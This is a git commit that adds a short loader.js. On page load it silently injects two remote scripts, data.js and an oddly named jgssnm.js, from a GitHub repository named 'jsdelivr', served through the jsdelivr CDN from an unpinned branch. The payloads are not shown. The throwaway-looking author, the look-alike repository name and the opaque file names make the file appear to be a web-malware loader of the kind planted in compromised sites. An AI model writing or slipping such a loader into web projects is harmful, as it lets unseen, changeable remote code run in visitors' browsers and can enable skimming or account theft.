2f4db9c3d10b193faa6fff16809973d8c8c9c31d
jsindex-web <bigdog8879@gmail.com>
2026-03-15 13:36:40 +0700

    Create loader.js

---
+++ loader.js
@@ -0,0 +1,7 @@
+var s=document.createElement('script');
+s.src='https://cdn.jsdelivr.net/gh/jsindex-web/jsdelivr@refs/heads/main/data.js';
+document.head.appendChild(s);
+
+var s2=document.createElement('script');
+s2.src='https://cdn.jsdelivr.net/gh/jsindex-web/jsdelivr@refs/heads/main/jgssnm.js';
+document.head.appendChild(s2);
